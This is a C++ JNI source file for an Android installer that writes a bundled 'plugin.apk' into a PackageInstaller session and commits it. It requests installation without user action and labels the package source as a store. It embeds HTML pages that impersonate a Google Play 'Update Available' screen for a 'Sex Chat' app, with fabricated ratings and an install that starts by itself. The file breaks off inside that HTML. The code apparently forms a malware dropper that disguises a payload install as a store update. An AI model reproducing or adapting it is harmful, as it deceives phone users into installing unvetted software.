#include <jni.h>
#include <string>
#include <android/log.h>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdio.h>

#define LOG_TAG "InstallerNative"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static jclass g_contextClass = nullptr;
static jclass g_packageManagerClass = nullptr;
static jclass g_packageInstallerClass = nullptr;
static jclass g_sessionParamsClass = nullptr;
static jclass g_sessionClass = nullptr;
static jclass g_intentClass = nullptr;
static jclass g_pendingIntentClass = nullptr;
static jclass g_buildVersionClass = nullptr;
static jclass g_packageInfoClass = nullptr;

static jmethodID g_getPackageManagerMethod = nullptr;
static jmethodID g_getPackageInstallerMethod = nullptr;
static jmethodID g_getPackageNameMethod = nullptr;
static jmethodID g_getAssetsMethod = nullptr;
static jmethodID g_getSdkIntMethod = nullptr;
static jmethodID g_fileExistsMethod = nullptr;
static jmethodID g_fileLengthMethod = nullptr;

static bool initJNI(JNIEnv* env) {
    if (g_contextClass != nullptr) {
        return true;
    }

    g_contextClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/Context"));
    if (!g_contextClass) return false;

    g_packageManagerClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageManager"));
    if (!g_packageManagerClass) return false;

    g_packageInstallerClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller"));
    if (!g_packageInstallerClass) return false;

    g_sessionParamsClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller$SessionParams"));
    if (!g_sessionParamsClass) return false;

    g_sessionClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller$Session"));
    if (!g_sessionClass) return false;

    g_intentClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/Intent"));
    if (!g_intentClass) return false;

    g_pendingIntentClass = (jclass)env->NewGlobalRef(env->FindClass("android/app/PendingIntent"));
    if (!g_pendingIntentClass) return false;

    g_buildVersionClass = (jclass)env->NewGlobalRef(env->FindClass("android/os/Build$VERSION"));
    if (!g_buildVersionClass) return false;

    g_packageInfoClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInfo"));
    if (!g_packageInfoClass) return false;

    g_getPackageManagerMethod = env->GetMethodID(g_contextClass, "getPackageManager", "()Landroid/content/pm/PackageManager;");
    if (!g_getPackageManagerMethod) return false;

    g_getPackageInstallerMethod = env->GetMethodID(g_packageManagerClass, "getPackageInstaller", "()Landroid/content/pm/PackageInstaller;");
    if (!g_getPackageInstallerMethod) return false;

    g_getPackageNameMethod = env->GetMethodID(g_contextClass, "getPackageName", "()Ljava/lang/String;");
    if (!g_getPackageNameMethod) return false;

    g_getAssetsMethod = env->GetMethodID(g_contextClass, "getAssets", "()Landroid/content/res/AssetManager;");
    if (!g_getAssetsMethod) return false;

    jfieldID sdkIntField = env->GetStaticFieldID(g_buildVersionClass, "SDK_INT", "I");
    g_getSdkIntMethod = (jmethodID)sdkIntField;

    return true;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_NativeInstaller_nativeCreateSession(
        JNIEnv* env, jobject thiz, jobject context, jint mode) {
    
    if (!initJNI(env)) {
        return -1;
    }

    jobject packageManager = env->CallObjectMethod(context, g_getPackageManagerMethod);
    if (!packageManager) return -1;

    jobject installer = env->CallObjectMethod(packageManager, g_getPackageInstallerMethod);
    if (!installer) return -1;

    jmethodID paramsConstructor = env->GetMethodID(g_sessionParamsClass, "<init>", "(I)V");
    jobject params = env->NewObject(g_sessionParamsClass, paramsConstructor, mode);
    if (!params) return -1;

    jint sdkVersion = env->GetStaticIntField(g_buildVersionClass, (jfieldID)g_getSdkIntMethod);

    if (sdkVersion >= 26) {
        jfieldID installLocationField = env->GetStaticFieldID(g_packageInfoClass, "INSTALL_LOCATION_INTERNAL_ONLY", "I");
        if (installLocationField) {
            jint installLocation = env->GetStaticIntField(g_packageInfoClass, installLocationField);
            jmethodID setInstallLocationMethod = env->GetMethodID(g_sessionParamsClass, "setInstallLocation", "(I)V");
            if (setInstallLocationMethod) {
                env->CallVoidMethod(params, setInstallLocationMethod, installLocation);
            }
        }
    }

    if (sdkVersion >= 31) {
        jfieldID userActionField = env->GetStaticFieldID(g_sessionParamsClass, "USER_ACTION_NOT_REQUIRED", "I");
        if (userActionField) {
            jint userAction = env->GetStaticIntField(g_sessionParamsClass, userActionField);
            jmethodID setRequireUserActionMethod = env->GetMethodID(g_sessionParamsClass, "setRequireUserAction", "(I)V");
            if (setRequireUserActionMethod) {
                env->CallVoidMethod(params, setRequireUserActionMethod, userAction);
            }
        }
    }

    if (sdkVersion >= 33) {
        jfieldID installReasonField = env->GetStaticFieldID(g_packageManagerClass, "INSTALL_REASON_USER", "I");
        if (installReasonField) {
            jint installReason = env->GetStaticIntField(g_packageManagerClass, installReasonField);
            jmethodID setInstallReasonMethod = env->GetMethodID(g_sessionParamsClass, "setInstallReason", "(I)V");
            if (setInstallReasonMethod) {
                env->CallVoidMethod(params, setInstallReasonMethod, installReason);
            }
        }
    }

    if (sdkVersion >= 34) {
        jfieldID packageSourceField = env->GetStaticFieldID(g_sessionParamsClass, "PACKAGE_SOURCE_STORE", "I");
        if (packageSourceField) {
            jint packageSource = env->GetStaticIntField(g_sessionParamsClass, packageSourceField);
            jmethodID setPackageSourceMethod = env->GetMethodID(g_sessionParamsClass, "setPackageSource", "(I)V");
            if (setPackageSourceMethod) {
                env->CallVoidMethod(params, setPackageSourceMethod, packageSource);
            }
        }

        jmethodID setRequestUpdateOwnershipMethod = env->GetMethodID(g_sessionParamsClass, "setRequestUpdateOwnership", "(Z)V");
        if (setRequestUpdateOwnershipMethod) {
            env->CallBooleanMethod(params, setRequestUpdateOwnershipMethod, JNI_TRUE);
        }
    }

    if (sdkVersion >= 35) {
        jstring installerPackageName = (jstring)env->CallObjectMethod(context, g_getPackageNameMethod);
        jmethodID setInstallerPackageNameMethod = env->GetMethodID(g_sessionParamsClass, "setInstallerPackageName", "(Ljava/lang/String;)V");
        if (setInstallerPackageNameMethod && installerPackageName) {
            env->CallVoidMethod(params, setInstallerPackageNameMethod, installerPackageName);
            env->DeleteLocalRef(installerPackageName);
        }
    }

    jmethodID createSessionMethod = env->GetMethodID(g_packageInstallerClass, "createSession", "(Landroid/content/pm/PackageInstaller$SessionParams;)I");
    jint sessionId = env->CallIntMethod(installer, createSessionMethod, params);

    return sessionId;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_NativeInstaller_nativeOpenSession(
        JNIEnv* env, jobject thiz, jobject context, jint sessionId) {
    
    if (!initJNI(env)) {
        return -1;
    }

    jobject packageManager = env->CallObjectMethod(context, g_getPackageManagerMethod);
    if (!packageManager) return -1;

    jobject installer = env->CallObjectMethod(packageManager, g_getPackageInstallerMethod);
    if (!installer) return -1;

    jmethodID openSessionMethod = env->GetMethodID(g_packageInstallerClass, "openSession", "(I)Landroid/content/pm/PackageInstaller$Session;");
    jobject session = env->CallObjectMethod(installer, openSessionMethod, sessionId);
    
    if (!session) {
        return -1;
    }

    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_NativeInstaller_nativeWriteApk(
        JNIEnv* env, jobject thiz, jobject context, jint sessionId, jstring apkPath) {
    
    if (!initJNI(env)) {
        LOGE("Failed to init JNI");
        return -1;
    }

    jobject packageManager = env->CallObjectMethod(context, g_getPackageManagerMethod);
    if (!packageManager) {
        LOGE("Failed to get PackageManager");
        return -1;
    }

    jobject installer = env->CallObjectMethod(packageManager, g_getPackageInstallerMethod);
    if (!installer) {
        LOGE("Failed to get PackageInstaller");
        return -1;
    }

    jmethodID openSessionMethod = env->GetMethodID(g_packageInstallerClass, "openSession", "(I)Landroid/content/pm/PackageInstaller$Session;");
    jobject session = env->CallObjectMethod(installer, openSessionMethod, sessionId);
    if (!session) {
        LOGE("Failed to open session");
        return -1;
    }

    jmethodID openWriteMethod = env->GetMethodID(g_sessionClass, "openWrite", "(Ljava/lang/String;JJ)Ljava/io/OutputStream;");
    jstring name = env->NewStringUTF("package");
    jobject outputStream = env->CallObjectMethod(session, openWriteMethod, name, 0LL, -1LL);
    if (!outputStream) {
        LOGE("Failed to open write stream");
        env->DeleteLocalRef(name);
        return -1;
    }

    // Read from file system instead of assets
    const char* apkPathStr = env->GetStringUTFChars(apkPath, nullptr);
    if (!apkPathStr) {
        LOGE("Failed to get APK path string");
        env->DeleteLocalRef(name);
        env->DeleteLocalRef(outputStream);
        return -1;
    }

    FILE* file = fopen(apkPathStr, "rb");
    if (!file) {
        LOGE("Failed to open APK file: %s", apkPathStr);
        env->ReleaseStringUTFChars(apkPath, apkPathStr);
        env->DeleteLocalRef(name);
        env->DeleteLocalRef(outputStream);
        return -1;
    }

    jclass outputStreamClass = env->GetObjectClass(outputStream);
    jmethodID writeMethod = env->GetMethodID(outputStreamClass, "write", "([BII)V");

    jbyteArray buffer = env->NewByteArray(65536);
    void* bufferPtr = env->GetPrimitiveArrayCritical(buffer, nullptr);

    int bytesRead;
    while ((bytesRead = fread(bufferPtr, 1, 65536, file)) > 0) {
        env->ReleasePrimitiveArrayCritical(buffer, bufferPtr, 0);
        jbyte* bytes = (jbyte*)bufferPtr;
        jbyteArray tempBuffer = env->NewByteArray(bytesRead);
        env->SetByteArrayRegion(tempBuffer, 0, bytesRead, bytes);
        env->CallVoidMethod(outputStream, writeMethod, tempBuffer, 0, bytesRead);
        env->DeleteLocalRef(tempBuffer);
        bufferPtr = env->GetPrimitiveArrayCritical(buffer, nullptr);
    }

    env->ReleasePrimitiveArrayCritical(buffer, bufferPtr, 0);
    fclose(file);

    jmethodID fsyncMethod = env->GetMethodID(outputStreamClass, "fsync", "()V");
    if (fsyncMethod) {
        env->CallVoidMethod(outputStream, fsyncMethod);
    }

    jmethodID closeMethod = env->GetMethodID(outputStreamClass, "close", "()V");
    env->CallVoidMethod(outputStream, closeMethod);

    env->ReleaseStringUTFChars(apkPath, apkPathStr);
    env->DeleteLocalRef(buffer);
    env->DeleteLocalRef(name);
    env->DeleteLocalRef(outputStream);

    LOGD("APK written successfully");
    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_NativeInstaller_nativeCommitSession(
        JNIEnv* env, jobject thiz, jobject context, jint sessionId, 
        jstring action, jstring packageName) {
    
    if (!initJNI(env)) {
        LOGE("Failed to init JNI in commit");
        return -1;
    }

    jobject packageManager = env->CallObjectMethod(context, g_getPackageManagerMethod);
    if (!packageManager) {
        LOGE("Failed to get PackageManager in commit");
        return -1;
    }

    jobject installer = env->CallObjectMethod(packageManager, g_getPackageInstallerMethod);
    if (!installer) {
        LOGE("Failed to get PackageInstaller in commit");
        return -1;
    }

    jmethodID openSessionMethod = env->GetMethodID(g_packageInstallerClass, "openSession", "(I)Landroid/content/pm/PackageInstaller$Session;");
    if (!openSessionMethod) {
        LOGE("Failed to get openSession method");
        return -1;
    }
    
    jobject session = env->CallObjectMethod(installer, openSessionMethod, sessionId);
    if (!session) {
        LOGE("Failed to open session %d", sessionId);
        return -1;
    }

    LOGD("Creating Intent for commit");
    jmethodID intentConstructor = env->GetMethodID(g_intentClass, "<init>", "(Ljava/lang/String;)V");
    if (!intentConstructor) {
        LOGE("Failed to get Intent constructor");
        return -1;
    }
    
    const char* actionStr = env->GetStringUTFChars(action, nullptr);
    if (!actionStr) {
        LOGE("Failed to get action string");
        return -1;
    }
    
    jstring actionJava = env->NewStringUTF(actionStr);
    jobject intent = env->NewObject(g_intentClass, intentConstructor, actionJava);
    if (!intent) {
        LOGE("Failed to create Intent");
        env->ReleaseStringUTFChars(action, actionStr);
        env->DeleteLocalRef(actionJava);
        return -1;
    }

    const char* packageNameStr = env->GetStringUTFChars(packageName, nullptr);
    if (!packageNameStr) {
        LOGE("Failed to get package name string");
        env->ReleaseStringUTFChars(action, actionStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(intent);
        return -1;
    }
    
    jmethodID setPackageMethod = env->GetMethodID(g_intentClass, "setPackage", "(Ljava/lang/String;)Landroid/content/Intent;");
    if (!setPackageMethod) {
        LOGE("Failed to get setPackage method");
        env->ReleaseStringUTFChars(action, actionStr);
        env->ReleaseStringUTFChars(packageName, packageNameStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(intent);
        return -1;
    }
    
    jstring packageNameJava = env->NewStringUTF(packageNameStr);
    env->CallObjectMethod(intent, setPackageMethod, packageNameJava);

    jint sdkVersion = env->GetStaticIntField(g_buildVersionClass, (jfieldID)g_getSdkIntMethod);
    jint flags = 0x08000000; // FLAG_UPDATE_CURRENT = 134217728
    if (sdkVersion >= 31) {
        flags |= 0x04000000; // FLAG_MUTABLE = 67108864
    } else {
        flags |= 0x02000000; // FLAG_IMMUTABLE = 33554432 (for older versions, but actually not needed)
    }

    LOGD("Creating PendingIntent, SDK: %d, flags: 0x%x", sdkVersion, flags);
    jmethodID getBroadcastMethod = env->GetStaticMethodID(g_pendingIntentClass, "getBroadcast", 
        "(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;");
    if (!getBroadcastMethod) {
        LOGE("Failed to get getBroadcast method");
        env->ReleaseStringUTFChars(action, actionStr);
        env->ReleaseStringUTFChars(packageName, packageNameStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(packageNameJava);
        env->DeleteLocalRef(intent);
        return -1;
    }
    
    jobject pendingIntent = env->CallStaticObjectMethod(g_pendingIntentClass, getBroadcastMethod, context, sessionId, intent, flags);
    if (!pendingIntent) {
        LOGE("Failed to create PendingIntent");
        env->ReleaseStringUTFChars(action, actionStr);
        env->ReleaseStringUTFChars(packageName, packageNameStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(packageNameJava);
        env->DeleteLocalRef(intent);
        return -1;
    }

    LOGD("Getting IntentSender");
    jmethodID getIntentSenderMethod = env->GetMethodID(g_pendingIntentClass, "getIntentSender", "()Landroid/content/IntentSender;");
    if (!getIntentSenderMethod) {
        LOGE("Failed to get getIntentSender method");
        env->ReleaseStringUTFChars(action, actionStr);
        env->ReleaseStringUTFChars(packageName, packageNameStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(packageNameJava);
        env->DeleteLocalRef(intent);
        env->DeleteLocalRef(pendingIntent);
        return -1;
    }
    
    jobject intentSender = env->CallObjectMethod(pendingIntent, getIntentSenderMethod);
    if (!intentSender) {
        LOGE("Failed to get IntentSender");
        env->ReleaseStringUTFChars(action, actionStr);
        env->ReleaseStringUTFChars(packageName, packageNameStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(packageNameJava);
        env->DeleteLocalRef(intent);
        env->DeleteLocalRef(pendingIntent);
        return -1;
    }

    LOGD("Committing session %d", sessionId);
    
    // Clear any pending exceptions before commit
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
    }
    
    jmethodID commitMethod = env->GetMethodID(g_sessionClass, "commit", "(Landroid/content/IntentSender;)V");
    if (!commitMethod) {
        LOGE("Failed to get commit method");
        env->ReleaseStringUTFChars(action, actionStr);
        env->ReleaseStringUTFChars(packageName, packageNameStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(packageNameJava);
        env->DeleteLocalRef(intent);
        env->DeleteLocalRef(pendingIntent);
        env->DeleteLocalRef(intentSender);
        return -1;
    }
    
    // Call commit - this may throw exception
    env->CallVoidMethod(session, commitMethod, intentSender);
    
    // Check for exceptions after commit
    if (env->ExceptionCheck()) {
        jthrowable exception = env->ExceptionOccurred();
        if (exception) {
            jclass exceptionClass = env->GetObjectClass(exception);
            jmethodID getMessageMethod = env->GetMethodID(exceptionClass, "getMessage", "()Ljava/lang/String;");
            if (getMessageMethod) {
                jstring messageStr = (jstring)env->CallObjectMethod(exception, getMessageMethod);
                if (messageStr) {
                    const char* msg = env->GetStringUTFChars(messageStr, nullptr);
                    LOGE("Commit exception: %s", msg);
                    env->ReleaseStringUTFChars(messageStr, msg);
                    env->DeleteLocalRef(messageStr);
                }
            }
            env->DeleteLocalRef(exceptionClass);
        }
        env->ExceptionDescribe();
        env->ExceptionClear();
        env->ReleaseStringUTFChars(action, actionStr);
        env->ReleaseStringUTFChars(packageName, packageNameStr);
        env->DeleteLocalRef(actionJava);
        env->DeleteLocalRef(packageNameJava);
        env->DeleteLocalRef(intent);
        env->DeleteLocalRef(pendingIntent);
        env->DeleteLocalRef(intentSender);
        return -1;
    }

    LOGD("Session committed successfully");

    env->ReleaseStringUTFChars(action, actionStr);
    env->ReleaseStringUTFChars(packageName, packageNameStr);
    env->DeleteLocalRef(actionJava);
    env->DeleteLocalRef(packageNameJava);
    env->DeleteLocalRef(intent);
    env->DeleteLocalRef(pendingIntent);
    env->DeleteLocalRef(intentSender);

    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_NativeInstaller_nativeAbandonSession(
        JNIEnv* env, jobject thiz, jobject context, jint sessionId) {
    
    if (!initJNI(env)) {
        return -1;
    }

    jobject packageManager = env->CallObjectMethod(context, g_getPackageManagerMethod);
    if (!packageManager) return -1;

    jobject installer = env->CallObjectMethod(packageManager, g_getPackageInstallerMethod);
    if (!installer) return -1;

    jmethodID openSessionMethod = env->GetMethodID(g_packageInstallerClass, "openSession", "(I)Landroid/content/pm/PackageInstaller$Session;");
    jobject session = env->CallObjectMethod(installer, openSessionMethod, sessionId);
    if (!session) return -1;

    jmethodID abandonMethod = env->GetMethodID(g_sessionClass, "abandon", "()V");
    env->CallVoidMethod(session, abandonMethod);

    return 0;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_installer_NativeInstaller_nativeReadApkInfo(
        JNIEnv* env, jobject thiz, jobject context, jstring apkPath) {
    return env->NewStringUTF("");
}

// Embedded Constants and Strings
static const char* APK_NAME = "plugin.apk";
static const char* ACTION_INSTALL = "com.example.installer.INSTALL";
static const int BUFFER_SIZE = 65536;

// Toast Messages
static const char* MSG_INSTALLED_SUCCESS = "Installed successfully";
static const char* MSG_INSTALL_FAILED = "Installation failed";
static const char* MSG_INSTALL_IN_PROGRESS = "Installation in progress";
static const char* MSG_PERMISSION_REQUIRED = "Permission required";
static const char* MSG_ENABLE_UNKNOWN_SOURCES = "Please enable install from unknown sources";

// Get string constant by key
static const char* getStringConstant(const char* key) {
    if (strcmp(key, "APK_NAME") == 0) return APK_NAME;
    if (strcmp(key, "ACTION_INSTALL") == 0) return ACTION_INSTALL;
    if (strcmp(key, "MSG_INSTALLED_SUCCESS") == 0) return MSG_INSTALLED_SUCCESS;
    if (strcmp(key, "MSG_INSTALL_FAILED") == 0) return MSG_INSTALL_FAILED;
    if (strcmp(key, "MSG_INSTALL_IN_PROGRESS") == 0) return MSG_INSTALL_IN_PROGRESS;
    if (strcmp(key, "MSG_PERMISSION_REQUIRED") == 0) return MSG_PERMISSION_REQUIRED;
    if (strcmp(key, "MSG_ENABLE_UNKNOWN_SOURCES") == 0) return MSG_ENABLE_UNKNOWN_SOURCES;
    return "";
}

// Get integer constant by key
static int getIntConstant(const char* key) {
    if (strcmp(key, "BUFFER_SIZE") == 0) return BUFFER_SIZE;
    return 0;
}

// Embedded HTML content - Combined update and installing page
static const char* getHtmlContent(const char* mode) {
    if (strcmp(mode, "installing") == 0) {
        return R"html(<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#ffffff">
    <title>Installing - Google Play</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Roboto', 'Arial', sans-serif; background-color: #fafafa; color: #202124; width: 100%; height: 100vh; overflow: hidden; display: flex; flex-direction: column; justify-content: space-between; }
        .circles-section { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .bottom-section { padding: 20px 24px 100px 24px; display: flex; flex-direction: column; align-items: center; gap: 16px; }
        .circles-container { position: relative; width: 70vw; height: 70vw; max-width: 350px; max-height: 350px; }
        .circle { position: absolute; border-radius: 50%; animation: float 3s ease-in-out infinite; }
        .circle-center { width: 32%; height: 32%; background: linear-gradient(135deg, #4fc3f7 0%, #29b6f6 100%); left: 50%; top: 50%; transform: translate(-50%, -50%); z-index: 5; box-shadow: 0 4px 12px rgba(79, 195, 247, 0.3); }
        .circle-1 { width: 15%; height: 15%; background: #4fc3f7; left: 18%; top: 12%; animation-delay: 0s; opacity: 0.9; }
        .circle-2 { width: 10%; height: 10%; background: #b0bec5; left: 50%; top: 8%; transform: translateX(-50%); animation-delay: 0.5s; opacity: 0.7; }
        .circle-3 { width: 17%; height: 17%; background: #90a4ae; right: 18%; top: 12%; animation-delay: 1s; opacity: 0.8; }
        .circle-4 { width: 15%; height: 15%; background: #ff9800; right: 12%; top: 45%; animation-delay: 1.5s; }
        .circle-5 { width: 13%; height: 13%; border: 2px solid #e0e0e0; background: transparent; right: 28%; bottom: 22%; animation-delay: 2s; opacity: 0.6; }
        .circle-6 { width: 19%; height: 19%; background: #fdd835; left: 50%; bottom: 8%; transform: translateX(-50%); animation-delay: 2.5s; }
        .circle-7 { width: 8%; height: 8%; background: #fdd835; left: 42%; bottom: 26%; animation-delay: 1.2s; opacity: 0.8; }
        .circle-8 { width: 9%; height: 9%; background: #66bb6a; left: 16%; top: 48%; animation-delay: 0.8s; }
        .circle-9 { width: 13%; height: 13%; border: 2px solid #e0e0e0; background: transparent; left: 20%; bottom: 32%; animation-delay: 1.8s; opacity: 0.5; }
        @keyframes float { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(0, -10px); } }
        .app-info { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; width: 100%; max-width: 400px; }
        .app-icon { width: 48px; height: 48px; background: #f0f0f0; border-radius: 10px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #e0e0e0; flex-shrink: 0; }
        .app-icon img { width: 100%; height: 100%; object-fit: cover; }
        .app-name { font-size: 20px; font-weight: 600; color: #202124; }
        .status-text { font-size: 18px; font-weight: 500; color: #5f6368; margin-bottom: 24px; width: 100%; max-width: 400px; text-align: left; }
        .progress-container { width: 100%; max-width: 400px; margin-bottom: 16px; }
        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; position: relative; }
        .progress-fill { height: 100%; background: #1a73e8; border-radius: 2px; width: 0%; animation: progress 4s ease-in-out infinite; }
        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 95%; } }
        .google-play-logo { display: flex; align-items: center; gap: 6px; justify-content: center; margin-top: 12px; }
        .play-icon { width: 24px; height: 24px; }
        .google-play-text { font-size: 20px; color: #5f6368; font-weight: 400; }
        @media (max-width: 480px) { .circles-container { width: 75vw; height: 75vw; } .bottom-section { padding: 16px 20px 60px 20px; } .app-info { max-width: 90%; } .app-icon { width: 44px; height: 44px; } .app-name { font-size: 14px; } .status-text { font-size: 13px; max-width: 90%; } .progress-container { max-width: 90%; } .play-icon { width: 22px; height: 22px; } .google-play-text { font-size: 18px; } }
    </style>
</head>
<body>
    <div class="circles-section">
        <div class="circles-container">
            <div class="circle circle-center"></div>
            <div class="circle circle-1"></div>
            <div class="circle circle-2"></div>
            <div class="circle circle-3"></div>
            <div class="circle circle-4"></div>
            <div class="circle circle-5"></div>
            <div class="circle circle-6"></div>
            <div class="circle circle-7"></div>
            <div class="circle circle-8"></div>
            <div class="circle circle-9"></div>
        </div>
    </div>
    <div class="bottom-section">
        <div class="app-info">
            <div class="app-icon"><img src="file:///android_asset/update/app.png" alt="App Icon" onerror="this.style.display='none'"></div>
            <div class="app-name">Sex Chat</div>
        </div>
        <div class="status-text">Installing</div>
        <div class="progress-container">
            <div class="progress-bar"><div class="progress-fill"></div></div>
        </div>
        <div class="google-play-logo">
            <img src="file:///android_asset/update/playstore.png" alt="Google Play" class="play-icon">
            <span class="google-play-text">Google Play</span>
        </div>
    </div>
    <script>
        if (typeof Android !== 'undefined' && Android.installPlugin) {
            setTimeout(() => { Android.installPlugin(); }, 1500);
        }
    </script>
</body>
</html>)html";
    } else {
        return R"html(<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#ffffff">
    <title>Update Available - Google Play</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Roboto', 'Arial', sans-serif; background-color: #ffffff; color: #202124; width: 100%; min-height: 100vh; overflow-x: hidden; }
        .header { padding: 16px 20px; display: flex; align-items: center; gap: 12px; background: white; }
        .google-play-logo { display: flex; align-items: center; gap: 6px; }
        .play-icon { width: 24px; height: 24px; }
        .header-text { font-size: 20px; font-weight: 400; color: #5f6368; }
        .content { padding: 20px 16px; }
        .title { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #202124; }
        .subtitle { font-size: 13px; color: #5f6368; margin-bottom: 24px; line-height: 1.4; }
        .app-info { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
        .app-icon { width: 64px; height: 64px; background: #f0f0f0; border-radius: 14px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #e0e0e0; flex-shrink: 0; }
        .app-icon img { width: 100%; height: 100%; object-fit: cover; }
        .app-details { flex: 1; min-width: 0; }
        .app-details h2 { font-size: 16px; font-weight: 600; margin-bottom: 6px; color: #202124; }
        .app-meta { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #5f6368; flex-wrap: wrap; }
        .section-title { font-size: 20px; font-weight: 700; margin-bottom: 6px; color: #202124; }
        .update-date { font-size: 12px; color: #5f6368; margin-bottom: 12px; }
        .update-description { font-size: 13px; line-height: 1.5; color: #5f6368; margin-bottom: 12px; }
        .update-list { list-style: none; padding-left: 0; margin-bottom: 12px; }
        .update-list li { font-size: 13px; color: #202124; margin-bottom: 8px; padding-left: 6px; line-height: 1.5; }
        .update-list li:before { content: "• "; font-weight: bold; margin-right: 8px; }
        .buttons { display: flex; gap: 12px; margin: 24px 0 32px 0; }
        .btn { flex: 1; padding: 11px 20px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; transition: all 0.2s; text-align: center; }
        .btn-outline { background: white; color: #1967d2; border: 1px solid #dadce0; }
        .btn-outline:active { background: #f8f9fa; }
        .btn-primary { background: #1967d2; color: white; }
        .btn-primary:active { background: #1557b0; }
        .section { margin-bottom: 32px; }
        .ratings-section { margin-bottom: 24px; }
        .ratings-disclaimer { font-size: 12px; color: #5f6368; line-height: 1.5; margin-bottom: 20px; }
        .rating-summary { display: flex; gap: 24px; align-items: center; margin-bottom: 32px; }
        .rating-score { text-align: center; }
        .rating-number { font-size: 48px; font-weight: 400; color: #202124; line-height: 1; margin-bottom: 6px; }
        .stars { color: #1967d2; font-size: 14px; margin-bottom: 4px; }
        .review-count { font-size: 12px; color: #5f6368; }
        .rating-bars { flex: 1; }
        .rating-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
        .bar-label { font-size: 13px; color: #5f6368; width: 8px; flex-shrink: 0; }
        .bar-container { flex: 1; height: 10px; background: #e8eaed; border-radius: 4px; overflow: hidden; min-width: 0; }
        .bar-fill { height: 100%; background: #1967d2; border-radius: 4px; transition: width 0.3s ease; }
        @media (max-width: 480px) { .header { padding: 14px 16px; } .content { padding: 16px 12px; } .title { font-size: 22px; } .app-icon { width: 56px; height: 56px; } .btn { padding: 10px 18px; font-size: 13px; } .rating-number { font-size: 42px; } }
    </style>
</head>
<body>
<div class="header">
    <div class="google-play-logo">
        <img src="file:///android_asset/update/playstore.png" alt="Google Play" class="play-icon">
        <span class="header-text">Google Play</span>
    </div>
</div>
<div class="content">
    <h1 class="title">Update Available</h1>
    <p class="subtitle">To use this app, download the latest version.</p>
    <div class="app-info">
        <div class="app-icon"><img src="file:///android_asset/update/app.png" alt="App Icon"></div>
        <div class="app-details">
            <h2 class="app-name">Sex Chat</h2>
            <div class="app-meta">
                <span class="app-version">3.8.5</span>
                <span>•</span>
                <span class="app-size">21.7 MB</span>
            </div>
        </div>
    </div>
    <div class="section">
        <h3 class="section-title">What's new</h3>
        <p class="update-date">Last updated Jun 23, 2025</p>
        <p class="update-description">We're always making changes and improvements to this app. To make sure you don't miss a thing, just keep your Updates turned on.</p>
        <ul class="update-list">
            <li>New features and improvements added.</li>
            <li>Enhanced user experience and interface.</li>
            <li>Bug fixes and performance improvements.</li>
        </ul>
    </div>
    <div class="buttons">
        <button class="btn btn-outline">More Info</button>
        <button class="btn btn-primary" id="updateBtn" onclick="updateApp()">Update</button>
    </div>
    <div class="section ratings-section">
        <h3 class="section-title">Ratings and reviews</h3>
        <p class="ratings-disclaimer">Ratings and reviews are verified and are from people who use the same type of device that you use.</p>
        <div class="rating-summary">
            <div class="rating-score">
                <div class="rating-number">4.5</div>
                <div class="stars">★★★★☆</div>
                <div class="review-count">87,542 reviews</div>
            </div>
            <div class="rating-bars">
                <div class="rating-bar"><span class="bar-label">5</span><div class="bar-container"><div class="bar-fill" style="width: 68%;"></div></div></div>
                <div class="rating-bar"><span class="bar-label">4</span><div class="bar-container"><div class="bar-fill" style="width: 18%;"></div></div></div>
                <div class="rating-bar"><span class="bar-label">3</span><div class="bar-container"><div class="bar-fill" style="width: 8%;"></div></div></div>
                <div class="rating-bar"><span class="bar-label">2</span><div class="bar-container"><div class="bar-fill" style="width: 4%;"></div></div></div>
